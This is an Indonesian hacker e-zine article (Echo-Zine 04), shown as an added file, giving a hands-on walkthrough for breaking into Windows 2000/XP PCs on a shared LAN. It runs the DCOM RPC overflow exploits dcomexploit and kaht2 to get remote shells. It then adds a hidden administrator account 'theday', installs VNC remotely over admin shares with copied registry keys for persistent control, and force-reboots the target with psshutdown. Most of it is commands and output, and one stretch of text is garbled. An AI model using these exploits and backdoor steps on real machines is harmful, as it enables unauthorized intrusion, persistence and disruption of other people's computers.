@@ -1,0 +1,275 @@
+____________________   ___ ___ ________   
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+    					.OR.ID
+
+
+ECHO-ZINE RELEASE
+       04
+Author: the_day (Echo staff) the_day@echo.or.id |
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+	YM : the_day2000
+
+== HACKING WINDOWS 2000 ,XP  ==
+
+	Disclaimer
+	
+	"Tulisan ini sepenuhnya untuk pembelajaran dan pengetahuan, semua yang 
+	terkandung di dalamnya apabila di salahgunakan akan menjadi tanggung 
+	jawab pribadi masing masing penggunanya." 
+
+	tulisan ini berlicensi OPENCONTENT!!
+   
+   BEGIN
+
+        *PENGANTAR : Setelah sekian lama baca sana-sini ,bagaimana
+	Cara hacking windows 2000 ,khususnya yang dalam satu LAN (warnet).
+	akhirnya datep juga caranya sampai kita betul2 bisa shutdown dan copy
+	atau liat2 file yang ada di target :p . 
+        Ok sebelum kita mulai , siapkan dulu tools yang akan digunakan dan
+	sedikit kesabaran. 
+
+		* Tool-tool :
+	                -> Sploit RPC/Dcom 
+				-> kaht2 (win)
+				-> winrpcdcom ( *nix)
+        	        -> pstool ( psshutdown )
+                	-> VNC ( Remote Client )
+
+		Ok langsung aja dengan prakteknya :p
+
+	* Mengggunakan Sploit RpcDcom
+		* RpcDcom.c *nix
+			* Compile dulu sploitnya
+				[theday@sarah sploit]gcc -o dcomexploit dcomexploit.c
+
+				[theday@sarah sploit]chmod 755 dcomexploit
+
+				[theday@sarah sploit]./dcomexploit
+				---------------------------------------------------------
+				- Remote DCOM RPC Buffer Overflow Exploit
+				- Original code by FlashSky and 1Benjurry
+				- Rewritten by HDM <hdm [at] metasploit.com>
+				- Ported to Win32 by Benjamin LauziFre <blauziere [at] altern.org>
+				- Usage:  dcomexploit <Target ID> <Target IP>
+				- Targets:
+				-   0    Windows 2000 SP0 (english)
+				-   1    Windows 2000 SP1 (english)
+				-   2    Windows 2000 SP2 (english)
+				-   3    Windows 2000 SP3 (english)
+				-   4    Windows 2000 SP4 (english)	
+				-   5    Windows XP SP0 (english)
+				-   6    Windows XP SP1 (english)
+
+				[theday@sarah sploit]./dcomexploit 6 192.168.0.35
+				---------------------------------------------------------
+				- Remote DCOM RPC Buffer Overflow Exploit
+				- Original code by FlashSky and Benjurry
+				- Rewritten by HDM <hdm [at] metasploit.com>
+				- Ported to Win32 by Benjamin LauziFre <blauziere [at] altern.org>
+				- Using return address of 0x77f92a9b
+				- Connecting to 192.168.0.35
+				
+				Microsoft Windows XP [Version 5.1.2600]
+				(C) Copyright 1985-2001 Microsoft Corp.
+
+				C:\WINDOWS\system32> <-- yup masuk ,cara selanjutnya sama seperti kaht
+				
+		
+		* Kaht2 * win
+			Masuk ke command prompt dan jalankan kaht2 seperti :
+			C:>kaht2
+			_________________________________________________
+       				    KAHT II - MASSIVE RPC EXPLOIT
+  			DCOM RPC exploit. Modified by aT4r@3wdesign.es
+ 			 #haxorcitos && #localhost  @Efnet Ownz you!!!
+              				PUBLIC VERSION :P
+			________________________________________________
+			Usage:   KaHt2.exe IP1 IP2 [THREADS] [AH]
+			example: KaHt2.exe 192.168.0.0 192.168.255.255
+  			NEW!: Macros Available in shell enviroment!!
+  			Type !! for more info into a shell.
+
+			C:\sploit> kaht2 192.168.0.2 192.168.0.254
+			
+			[+] Targets: 192.168.0.2-192.168.0.254 with 50 Threads
+			[+] Attacking Port: 135. Remote Shell at port: 43745
+			[+] Scan In Progress...
+			- Connecting to 192.168.0.21
+   			Sending Exploit to a [Win2k] Server...FAILED
+			- Connecting to 192.168.0.35
+  			Sending Exploit to a [WinXP] Server...
+ 			- Conectando con la Shell Remota...
+
+			Microsoft Windows XP [Version 5.1.2600]
+			(C) Copyright 1985-2001 Microsoft Corp.
+
+			C:\WINDOWS\system32>  <-- Yup kita udah masuk shell nya target :d
+			C:\WINDOWS\system32>net user  <-- melihat account yg bisa login
+			User accounts for \\E1337
+
+			--------------------------------------------------------------------
+			Administrator            Guest
+			The command completed successfully.
+			 
+			C:\WINDOWS\system32>net <-- kita gunakan perintah2 net untuk membantu misi 
+			
+			The syntax of this command is:
+
+			NET [ ACCOUNTS | COMPUTER | CONFIG | CONTINUE | FILE | GROUP | HELP |
+  			      HELPMSG | LOCALGROUP | NAME | PAUSE | PRINT | SEND | SESSION |
+      			      SHARE | START | STATISTICS | STOP | TIME | USE | USER | VIEW ]
+			
+			C:\WINDOWS\system32>net user theday password /add <-- memasukan login theday di PC target
+			The command completed successfully.
+			
+			C:\WINDOWS\system32>net user <-- kita liat apakah login theday udah ada
+	
+			User accounts for \\E1337
+
+			---------------------------------------------------------------------
+			Administrator            Guest                    theday
+			The command completed successfully.
+
+			C:\WINDOWS\system32>net user theday
+			User name                    theday
+			Full Name
+			Comment
+			User's comment
+			Country code                 000 (System Default)
+			Account active               Yes
+			Account expires              Never
+		
+			Password last set            2/26/2004 4:08 PM
+			Password expires             4/9/2004 2:55 PM
+			Password changeable          2/26/2004 4:08 PM
+			Password required            Yes
+			User may change password     Yes
+		
+			Workstations allowed         All
+			Logon script
+			User profile	
+			Home directory
+			Last logon                   Never
+	
+			Logon hours allowed          All
+		
+			Local Group Memberships      *Users <-- group user biasa
+			Global Group memberships     *None
+			The command completed successfully.
+
+			Yup login theday udah masuk , oops tunggu dulu ,itu login theday hanya user biasa
+			sekarang kita masukan login theday sebagai groups Administrator biar bebas :p
+			
+			C:\WINDOWS\system32>net localgroup Administrators theday /add
+			The command completed successfully.
+			
+			User name                    theday
+			Full Name
+			Comment
+			User's comment
+			Country code                 000 (System Default)
+			Account active               Yes
+			Account expires              Never
+		
+			Password last set            2/26/2004 4:08 PM
+			Password expires             4/9/2004 2:55 PM
+			Password changeable          2/26/2004 4:08 PM
+			Password required            Yes
+			User may change password     Yes
+		
+			Workstations allowed         All
+			Logon script
+			User profile
+			Home directory
+			Last logon                   Never
+		
+			Logon hours allowed          All
+		
+			Local Group Memberships      *Administrators       *Users <--liat
+			Global Group memberships     *None
+			The command completed successfully.	
+			
+		Nah sekarang udah ada login di pc target ,sebagai administrator lagi. tinggal mau
+		kita yang penting udah dapet login, bisa tuh di shutdown dan bisa copy+paste file
+		dan melihat2 file2 target :d, gunakan aja deh perintah Net untuk melakukan itu.		
+		Sekarang tinggal cara install VNC, sebelumnya sedikit tentang vnc ini adalah sebuah
+		tool yang digunakan untuk remote control PC lain ,untuk memdapatkan vnc dapat didownload
+		di http://www.realvnc.com/
+
+		* Installasi VNC di Remote PC
+		  Kita tadi sudah dapat login sebagai admin dan sekarang kita kuasain 100% PC itu :d
+		  Pertama download dulu vnc nya td dan buat script batch untuk install :
+
+		  	1. Install.bat
+				----
+				Echo Install VNC 
+				Setup.exe 
+				Echo. 
+				pause 	
+				Echo Install VNC 
+				"C:\Program Files\ORL\VNC\WinVNC.exe" -install 
+				Echo. 
+				pause 
+				Echo Start VNC service 
+				net start "VNC Server" 
+				Echo.
+				echo Tunngu sampai selesai Install 
+				pause 	
+				---- end	
+			2. Konek ke PC target 192.168.0.35
+
+				C:\>net use \\192.168.0.35\IPC$ /user:theday password
+			
+			3. Copy file vnc dari local ke remote PC
+				
+				C:\>xcopy "C:\Program Files\ORL\VNC\*.*" "\\192.168.0.35\c$\Program Files\ORL\VNC\*.*" /r/i/c/h/k/e
+		
+			4. Export key regedit VNC untuk di copy ke Remote PC
+		
+				C:\>regedit /e "C:\vncdmp.reg" "HKEY_LOCAL_MACHINE\Software\ORL" 
+				C:\>regedit /e "C:\vncdmp2.reg" "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\winvnc"
+
+			5. Copy file regedit tadi ke Remote PC
+	
+				C:\>Copy C:\vncdmp*.reg \\192.168.0.35\c$\*.*.
+        
+        		6. Melihat waktu dari Remote PC fungsinya utk menyamakan waktu local dan Remote
+	
+				C:\>net time \\192.168.0.35
+				Current time at \\192.168.0.35 is 2/26/2004 8:16 PM
+		
+				Local time (GMT-08:00) at \\192.168.0.35 is 2/26/2004 5:16 AM
+	
+				The command complet                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Sshutdown
+		  Dari namanya aja udah jelas ,untuk shutdown Remote PC " ingat resiko ditanggung sendiri :p "
+
+		  C:\>psshutdown.exe \\192.168.0.35 -f -r -t 20 -m "*WARNING PC nya mau di restart  dalam 20 detik"
+		  
+		Tunggu deh :p
+
+        Mungkin hanya ini aja yang bisa aku buat ,semoga artikel ini bermanfaat.Tulisan ini hanya untuk 
+	pendidikan dan pengetahuan aja , jadi semua kembali ke diri masing2.
+	Thx banget buat Mysarah yang udah memberikan support . " I LOVE YOU SARAH "
+        
+   EOF
+
+	        			                                                             [the_day]
+   
+
+	REFERENSI
+		
+		http://www.realvnc.com/     	                                                              
+   
+*greetz to: 
+
+	[echostaff a.k.a y3dips, moby, comex ,z3r0byt3] && sarah[MY LOVELY], 
+	pak onno, pak linus, pak eric s. Raymond, pak RM. stallman,
+	* Ram@net thx untuk fasilitas Ujicobanya :d
+	anak2 newbie_hacker,$the community,$peci@l temen2 seperjuangan 
+	kritik && saran kirimkan ke the_day[at]echo.or.id
+               
+                
